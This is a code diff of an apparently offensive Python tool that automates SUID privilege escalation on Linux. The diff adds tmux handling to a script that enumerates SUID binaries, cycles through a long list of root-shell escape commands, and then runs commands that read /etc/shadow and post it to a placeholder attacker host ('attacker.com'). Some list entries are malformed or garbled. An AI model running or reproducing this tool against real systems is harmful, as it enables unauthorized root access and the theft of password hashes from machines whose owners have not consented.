@@ -6,6 +6,7 @@ from colorama import Fore, Back, Style
 def flsh_print(string):
     print (string, flush = True)
 
+
 flsh_print(" ")
 flsh_print(Style.BRIGHT + """ # Automated suid privilege escalation tool # """)
 flsh_print ("""-----------------------------------------------""")
@@ -13,14 +14,13 @@ flsh_print (              """  #       https://github.com/ValentaA      # """)
 flsh_print ("""-----------------------------------------------""")
 
 
-#If you get the shell but it's not root, just comment that specific command/commands or remove it from the 'get_root' list!
-
 #Save suid bits to file 
 flsh_print("[+]Saving available suid bits to file 'list.txt'")
 basename2 = ("$file")
 os.system('''find / -type f -perm -4000 -ls 2>/dev/null | while read -r file; do basename "$file" | cut -d. -f1; done > list.txt''')
 
-#list suid option
+
+#List suid option
 flsh_print ("[+]List suid bits?")
 get_suid = input("[+]Y/N: ")
 if get_suid == "Y" or get_suid == "y":
@@ -28,77 +28,100 @@ if get_suid == "Y" or get_suid == "y":
     get_suid = os.system ("find / -type f -perm -04000 -ls 2>/dev/null")
 
 
+#Get_root list
+get_root = [
+    "./agetty -o -p -l /bin/sh -a root tty", "./agetty -o `-p` -l /bin/sh -a root tty", "./ash",
+    "./busybox sh", "./cabal exec -- /bin/sh -p", "./cabal exec -- /bin/sh `-p`", "./capsh --gid=0 --uid=0 --",
+    "./choom -n 0 -- /bin/sh -p", "./choom -n 0 -- /bin/sh `-p`", "./cpulimit -l 100 -f -- /bin/sh -p",
+    "./cpulimit -l 100 -f -- /bin/sh `-p`", "./csh -b", "./dash -p", "./dash `-p`", "./debugfs", "!/bin/sh",
+    "./distcc /bin/sh -p", "./distcc /bin/sh `-p`", "./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208",
+    "EOF", "./dmsetup ls --exec '/bin/sh -p -s'", "./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208",
+    "EOF", "./dmsetup ls --exec '/bin/sh `-p` -s'", "./chroot / /bin/sh `-p`", "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "./elvish", "./env /bin/sh -p", "./env /bin/sh `-p`", "./expect -c 'spawn /bin/sh -p;interact'", "./find . -exec /bin/sh -p \; -quit",
+    "./find . -exec /bin/sh `-p` \; -quit", "./fish", "./flock -u / /bin/sh -p", "./flock -u / /bin/sh `-p`", "./gcore $PID",
+    "./genie -c '/bin/sh'", "TF=$(mktemp)", "echo '#!/bin/sh -p' > $TF", "./ionice /bin/sh -p", "./ionice /bin/sh `-p`",
+    "./julia -e 'run(`/bin/sh -p`)'", "./ksh -p", "./ksh `-p`", "./ld.so /bin/sh -p", "./ld.so /bin/sj `-p`", "./multitime /bin/sh -p",
+    "./multitime /bin/sh `-p`", "./ncftp", "!/bin/sh -p", "./ncftp", "!/bin/sh `-p`", "./nice /bin/sh -p", "./nice /bin/sh `-p`",
+    './nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"', './nohup /bin/sh -p -c "sh `-p` <$(tty) >$(tty) 2>$(tty)"',
+    "./perf stat /bin/sh -p", "./perf stat /bin/sh `-p`", "./pexec /bin/sh -p", "./pexec /bin/sh `-p`", "COMMAND=id",
+    "./pidstat -e $COMMAND", "./rc -c '/bin/sh -p'", "./rc -c '/bin/sh `-p`'", "./rlwrap -H /dev/null /bin/sh -p",
+    "./rlwrap -H /dev/null /bin/sh `-p`", 'echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc./rtorrent',
+    "./run-parts --new-session --regex '^sh$' /bin --arg='-p'", "./sash", "./scanmem", "shell /bin/sh", "./setarch $(arch) /bin/sh -p",
+    "./setarch $(arch) /bin/sh `-p`", "./setlock - /bin/sh -p", "./setlock - /bin/sh `-p`", "./softlimit /bin/sh -p",
+    "./softlimit /bin/sh `-p`", "./ssh-agent /bin/ -p", "./ssh-keygen -D ./lib.so", "./sshpass /bin/sh -p", "./sshpass /bin/sh `-p`",
+    "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p", "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- `-p`",
+    "./stdbuf -i0 /bin/sh -p", "./stdbuf -i0 /bin/sh `-p`", "./strace -o /dev/null /bin/sh -p", "./strace -o /dev/null /bin/sh `-p`",
+    "./taskset 1 /bin/sh -p", "./taskset 1 /bin/sh `-p`", "./tclsh", "exec /bin/sh -p <@stdin >@stdout 2>@stderr", "./tclsh",
+    "exec /bin/sh `-p` <@stdin >@stdout 2>@stderr", "./time /bin/sh -p", "./time /bin/sh `-p`", "./timeout 7d /bin/sh -p",
+    "./timeout 7d /bin/sh `-p`", "./unshare -r /bin/sh", "./unzip -K shell.zip", "./sh -p", "./unzip -K shell.zip", "./sh `-p`",
+    "./vigr", "./vipw", "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'", "./watch -x sh `-p` -c 'reset; exec sh `-p` 1>&0 2>&0'",
+    "TF=$(mktemp)", "chmod +x $TF", "echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF", "./wget --use-askpass=$TF 0",
+    "./xargs -a /dev/null sh -p", "./xargs -a /dev/null sh `-p`", "./xdotool exec --sync /bin/sh -p", "./xdotool exec --sync /bin/sh `-p`",
+    "./yash", "./zsh"
+]
 
-# get_root list
-get_root = ["./agetty -o -p -l /bin/sh -a root tty", "./agetty -o `-p` -l /bin/sh -a root tty", "./ash",
-"./busybox sh", "./cabal exec -- /bin/sh -p", 
-"./cabal exec -- /bin/sh `-p`", "./capsh --gid=0 --uid=0 --", 
-"./choom -n 0 -- /bin/sh -p", "./choom -n 0 -- /bin/sh `-p`",
-"./cpulimit -l 100 -f -- /bin/sh -p", "./cpulimit -l 100 -f -- /bin/sh `-p`", 
-"./csh -b","./dash -p", "./dash `-p`", "./debugfs", "!/bin/sh", 
-"./distcc /bin/sh -p", "./distcc /bin/sh `-p`", "./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208", "EOF", "./dmsetup ls --exec '/bin/sh -p -s'",  
-"./dmsetup create base <<EOF", "0 3534848 linear /dev/loop0 94208", "EOF",
-"./dmsetup ls --exec '/bin/sh `-p` -s'", "./chroot / /bin/sh `-p`",
-"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "./elvish",
-"./env /bin/sh -p", "./env /bin/sh `-p`", "./expect -c 'spawn /bin/sh -p;interact'", 
-"./find . -exec /bin/sh -p \; -quit", "./find . -exec /bin/sh `-p` \; -quit", 
-"./fish", "./flock -u / /bin/sh -p", "./flock -u / /bin/sh `-p`", 
-"./gcore $PID", "./genie -c '/bin/sh'", "TF=$(mktemp)", "echo '#!/bin/sh -p' > $TF", 
-"./ionice /bin/sh -p", "./ionice /bin/sh `-p`", "./julia -e 'run(`/bin/sh -p`)'", 
-"./ksh -p", "./ksh `-p`", "./ld.so /bin/sh -p", "./ld.so /bin/sj `-p`", 
-"./multitime /bin/sh -p", "./multitime /bin/sh `-p`", "./ncftp", "!/bin/sh -p", "./ncftp", "!/bin/sh `-p`",
-"./nice /bin/sh -p", "./nice /bin/sh `-p`",
-'./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"', './nohup /bin/sh -p -c "sh `-p` <$(tty) >$(tty) 2>$(tty)"', 
-"./perf stat /bin/sh -p", "./perf stat /bin/sh `-p`", "./pexec /bin/sh -p", 
-"./pexec /bin/sh `-p`", "COMMAND=id", "./pidstat -e $COMMAND", "./rc -c '/bin/sh -p'", "./rc -c '/bin/sh `-p`'", 
-"./rlwrap -H /dev/null /bin/sh -p", "./rlwrap -H /dev/null /bin/sh `-p`",
-'echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc./rtorrent',
-"./run-parts --new-session --regex '^sh$' /bin --arg='-p'", 
-"./sash", "./scanmem", "shell /bin/sh", "./setarch $(arch) /bin/sh -p", "./setarch $(arch) /bin/sh `-p`", 
-"./setlock - /bin/sh -p", "./setlock - /bin/sh `-p`", "./softlimit /bin/sh -p", "./softlimit /bin/sh `-p`", 
-"./ssh-agent /bin/ -p", "./ssh-keygen -D ./lib.so", "./sshpass /bin/sh -p", "./sshpass /bin/sh `-p`", 
-"./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p", "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- `-p`",
-"./stdbuf -i0 /bin/sh -p", "./stdbuf -i0 /bin/sh `-p`", "./strace -o /dev/null /bin/sh -p", "./strace -o /dev/null /bin/sh `-p`",
-"./taskset 1 /bin/sh -p", "./taskset 1 /bin/sh `-p`", "./tclsh", "exec /bin/sh -p <@stdin >@stdout 2>@stderr", "./tclsh", 
-"exec /bin/sh `-p` <@stdin >@stdout 2>@stderr", "./time /bin/sh -p"
-"./time /bin/sh `-p`", "./timeout 7d /bin/sh -p", "./timeout 7d /bin/sh `-p`",
-"./unshare -r /bin/sh", "./unzip -K shell.zip", "./sh -p","./unzip -K shell.zip", "./sh `-p`",
-"./vigr", "./vipw", "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'",
-"./watch -x sh `-p` -c 'reset; exec sh `-p` 1>&0 2>&0'", "TF=$(mktemp)", "chmod +x $TF",
-"echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF", "./wget --use-askpass=$TF 0",
-"./xargs -a /dev/null sh -p", "./xargs -a /dev/null sh `-p`", "./xdotool exec --sync /bin/sh -p", 
-"./xdotool exec --sync /bin/sh `-p`", "./yash", "./zsh"]
 
+#Keep just suid names
 get_root_wth_pth = [item.lstrip("./") for item in get_root]
+
 
 with open ("list.txt", "r") as listed:
     lsted = listed.read()
+ 
     
 def app_name(command):
     return command.split()[0]
         
 
+#Function to create a new tmux session if it doesn't exist
+def create_tmux_session(session_name):
+    result = subprocess.run(["tmux", "has-session", "-t", session_name], capture_output=True)
+    if result.returncode != 0:
+        subprocess.run(["tmux", "new-session", "-d", "-s", session_name])
+        return True
+    return False
+
+
+tmux = "aspet_session"
+session_created = False
+
+
 #Search with path added
-for shell in get_root:
-    flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
-    flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
+for shell in get_root_wth_pth:
+    flsh_print("[+]Trying to get root shell - CTRL + C if stuck")
+    flsh_print("[+]Use commands 'exit' or 'quit' to close the shell")
     for app in lsted:
         if app in app_name(shell):
-            subprocess.Popen(shell, shell = True)
-        else: 
-             flsh_print ("[+]Wrong path")
-       
+            if not session_created:
+                session_created = create_tmux_session(tmux)
+            subprocess.run(["tmux", "send-keys", "-t", tmux, "clear", "C-m"])
+            subprocess.run(["tmux", "send-keys", "-t", tmux, shell + " && exit", "C-m"])
+            break  # Exit the loop once the condition is met
+        else:
+            flsh_print("[+]Not found")
+
+
 
 #Search without path added
-for shel in get_root_wth_pth: 
-    flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
-    flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
+for shel in get_root_wth_pth:
+    flsh_print("[+]Trying to get root shell - CTRL + C if stuck")
+    flsh_print("[+]Use commands 'exit' or 'quit' to close the shell")
     for app in lsted:
         if app in app_name(shel):
-            subprocess.Popen(shel, shell = True)
+            if not session_created:
+                session_created = create_tmux_session(tmux)
+            subprocess.run(["tmux", "send-keys", "-t", tmux, "clear", "C-m"])
+            subprocess.run(["tmux", "send-keys", "-t", tmux, shel + " && exit", "C-m"]) 
+            break  # Exit the loop once the condition is met
         else:
-             flsh_print ("[+]Not found")
+            flsh_print("[+]Not found")
 
+
+subprocess.run(["tmux", "attach-session", "-t", tmux])
+
+
+#Clean early created suid list file
+os.system("rm list.txt")
 
 
 flsh_print ("[+]------------------------------")
@@ -106,8 +129,8 @@ flsh_print ("[+]Continue with get /etc/shadow?")
 option_hash = input("Y/N: ")
 
 
-#get_hash list:  
-#change url to attacker machine
+#Get_hash list:  
+#Change url to attacker machine
 get_hash = ["URL=http://attacker.com/", "LFILE=file_to_send", "ab -p $LFILE $URL", "LFILE=/etc/shadow", './alpine -F "$LFILE"',
 "TF=$(mktemp -u)", "LFILE=/etc/shadow" './ar r "$TF" "$LFILE"', 'cat "$TF"',
 "TF=$(mktemp -d)","LFILE=---------","LDIR=--------", 'echo DATA >"$TF/$LFILE', 'arj a "$TF/a" "$TF/$LFILE"', './arj e "$TF/a" $LDIR',
@@ -165,12 +188,13 @@ for x in get_hash:
         flsh_print ("[*]Trying to read /etc/shadow - CTRL + C if stuck")
         x = os.system(x)
         
-#Clean suid bits file
-os.system("rm list.txt")
 
 flsh_print ("[+]------------------------------") 
 flsh_print ("[+]For more binaries and techniques visit: https://gtfobins.github.io/")  
 flsh_print("""----------------------------------------------------------------------""")
+
+
+
 
 
 
